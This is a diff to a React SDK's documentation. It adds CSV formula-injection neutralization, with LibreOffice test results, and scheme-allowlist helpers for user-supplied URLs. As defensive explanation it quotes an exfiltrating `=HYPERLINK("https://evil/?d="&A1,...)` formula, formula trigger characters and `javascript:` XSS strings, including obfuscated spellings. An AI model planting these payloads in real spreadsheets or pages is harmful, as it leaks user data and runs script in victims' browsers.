@@ -450,13 +450,33 @@ await downloadCsv(users, COLUMNS, "users.csv"); // hand it to the user
 | `toCsv(rows, columns, options?)` | Returns the whole file as a `string`. |
 | `downloadCsv(rows, columns, fileName?, options?)` | Builds the `text/csv;charset=utf-8` blob and passes it to `shareOrDownloadBlob`. |
 | `CsvColumn<T>` | `{ key, header, csv? }` |
-| `CsvOptions` | `{ delimiter?: "," \| ";", bom?: boolean }` — defaults `","` and `true`. |
+| `CsvOptions` | `{ delimiter?: "," \| ";", bom?: boolean, neutralizeFormulas?: boolean }` — defaults `","`, `true` and `true`. |
 
 !!! danger "A `DataTable` column does **not** work as-is once it has `render`"
     `DataTableColumn.render` returns a `ReactNode`. Exporting that writes `[object Object]` in exactly the column that holds a badge, a link or a formatted date — the table's most important one. A column **without** `render` is structurally compatible and can be reused; with `render`, give it the `csv` accessor.
 
 !!! check "RFC 4180 escaping, plus the BOM Excel pt-BR insists on"
     A field containing the delimiter, a quote or a line break becomes a quoted field, and each inner quote is doubled. Rows terminate with `\r\n`. The BOM is on by default because without it Excel on a pt-BR install reads UTF-8 as Latin-1 and every accent turns into mojibake.
+
+!!! check "Formulas become text by default (CSV injection)"
+    A text field starting with `=`, `+`, `-`, `@`, TAB or CR is treated as the start of a **formula** by the OWASP list — Excel and Google Sheets read it that way; LibreOffice 26.2 only evaluated `=` (table below). Opening the file evaluates the formula. A user name `=HYPERLINK("https://evil/?d="&A1,"view")` becomes a link that leaks the other cells. So `toCsv` and `downloadCsv` prefix `'` to those fields, as OWASP recommends: LibreOffice 26.2 imported `=1+2` as the formula `of:=1+2` (value `3`) before, and as the text `'=1+2` after.
+
+    Numbers are left alone: a `number` cell, or text that is only a number (`"-5"`, `"-1.234,56"`, `"+42"`), cannot be a formula — and prefixing it would turn every negative amount in the report into text. A lone `"-"` is left alone too: it is the "no value" placeholder and has no operand to become a formula. The cost is the visible `'` in neutralized text. If the file feeds another system's importer rather than a person's spreadsheet, turn it off with `{ neutralizeFormulas: false }` and the bytes go out as they came.
+
+How each input is read, measured by converting the CSV with LibreOffice 26.2 headless (`soffice --headless --infilter="CSV:59,34,76,1" --convert-to fods`) and reading each cell's `table:formula`:
+
+| Input | Without prefix (`neutralizeFormulas: false`) | With prefix (default) |
+| --- | --- | --- |
+| `=1+2` | formula, value `3` | text `'=1+2` |
+| `=HYPERLINK("http://…/?d="&A1,"x")` | formula | text |
+| `+55 (11) 99999-9999` | text | text `'+55 (11) 99999-9999` |
+| `@maria` | text | text `'@maria` |
+| `-` | text | text `-` (exempt) |
+| TAB + `=1+1` | text | text `'` + TAB + `=1+1` |
+| space + `=1+1` | text | text (not a trigger) |
+| `\n=1+1` (quoted field) | text | text (not a trigger) |
+
+LibreOffice only evaluated `=`. `+`, `@` and TAB stay in the trigger because Excel and Google Sheets read them as the start of a formula — that is OWASP's list, and it was not measured in Excel here.
 
 !!! tip "`;` is the right delimiter in a pt-BR locale"
     Where the decimal separator is the comma, Excel opens a comma-separated CSV **in a single column**. `{ delimiter: ";" }` fixes it — and the escaping follows, quoting the field that contains `;` instead of the one that contains `,`.
@@ -468,6 +488,43 @@ await downloadCsv(users, COLUMNS, "users.csv"); // hand it to the user
     Whoever opens it needs to see which columns they asked for. A zero-byte file looks like a failed export.
 
 ---
+
+## A URL that came from someone else — `safeLinkUrl`, `safeImageUrl`, `safeAttachmentUrl`
+
+Every `href` built from user data is a place where `javascript:alert(1)` becomes script on click. React 19 swaps a `javascript:` `href` for a stub that throws, but the SDK accepts React 18 — and 18 only warns in the console. Measured with `react-dom` 18.3.1: the `href` is written verbatim, and clicking it runs the script in Chromium 153 and Firefox 155, **even with `download`** on the `<a>`.
+
+The three helpers are the same scheme allowlist that `Markdown` and `Chat` use internally. They return the URL, or `null` when it must not become an `href`/`src`:
+
+```tsx
+import { safeAttachmentUrl, safeImageUrl, safeLinkUrl } from "tempest-react-sdk";
+
+export function Attachment({ url, name }: { url: string; name: string }) {
+  const href = safeAttachmentUrl(url);
+  return href ? (
+    <a href={href} download={name}>
+      {name}
+    </a>
+  ) : (
+    <span>{name}</span>
+  );
+}
+
+safeLinkUrl("https://x.dev"); // "https://x.dev"
+safeLinkUrl("JaVaScRiPt:alert(1)"); // null
+safeImageUrl("data:image/svg+xml;base64,PHN2Zz4="); // null
+```
+
+| Helper | Accepts | Use for |
+| --- | --- | --- |
+| `safeLinkUrl` | `http`, `https`, `mailto`, `tel`, `sms`, relative | a link the person clicks |
+| `safeImageUrl` | the same + raster `data:image/` (png/jpeg/gif/webp/avif/bmp) | an image `src` |
+| `safeAttachmentUrl` | `http`, `https`, `blob`, relative + raster `data:image/` | a file to download — `blob:` is the upload still in flight |
+
+!!! check "Allowlist, not blocklist"
+    Before comparing, all three strip whitespace and control characters, so `java\tscript:` and `\u0001javascript:` fall as `javascript:`. A blocklist would have to enumerate every spelling; the allowlist refuses what it does not know.
+
+!!! info "`safeAttachmentUrl` returns the URL as given"
+    The scheme is judged on the normalized form, but the original comes back: normalizing deletes spaces, and `/files/final report.pdf` is a real path. Normalization only **removes** characters — more than the browser's URL parser removes — so there is no scheme the browser sees that the helper does not.
 
 ## Compressed storage — `compressedStorage`
 
@@ -571,7 +628,8 @@ Same best-effort policy as the JSON pair: SSR-safe, never throws, swallows quota
 
 - Import any helper straight from `tempest-react-sdk` — they are all named, pure, tree-shakable exports.
 - **Spreadsheets**: `writeXlsx(headers, rows)` builds a single-sheet UTF-8 `.xlsx` as a `Uint8Array` (no CSV BOM drama).
-- **CSV**: `toCsv(rows, columns)` writes the file with RFC 4180 escaping and a BOM; `downloadCsv(...)` hands it straight to the user.
+- **CSV**: `toCsv(rows, columns)` writes the file with RFC 4180 escaping and a BOM, and neutralizes formulas by default; `downloadCsv(...)` hands it straight to the user.
+- **User URLs**: `safeLinkUrl`, `safeImageUrl` and `safeAttachmentUrl` return the URL or `null` — a scheme allowlist before any `href`/`src`.
 - **Dates and percentages**: `formatDateForInput` gives the `yyyy-MM-dd` an `<input type="date">` insists on and `formatDateTimeForInput` gives the `yyyy-MM-ddTHH:mm` an `<input type="datetime-local">` wants (both from local parts, without the UTC shift); `percentOf` returns `0` instead of `NaN` when the base is zero.
 - **Compressed storage**: `compressedStorage.get/set` gzips what it writes; the self-describing format (`~tgz1:`) reads older values with no migration. In React, `useLocalStorage(key, def, compressedStorageCodec)`.
 - **Arrays/Objects**: `groupBy`, `uniqueBy`, `chunk`, `range`, `pick`, `omit`, `deepMerge`, `isEmpty` — always immutable; `deepMerge` replaces arrays instead of merging them.
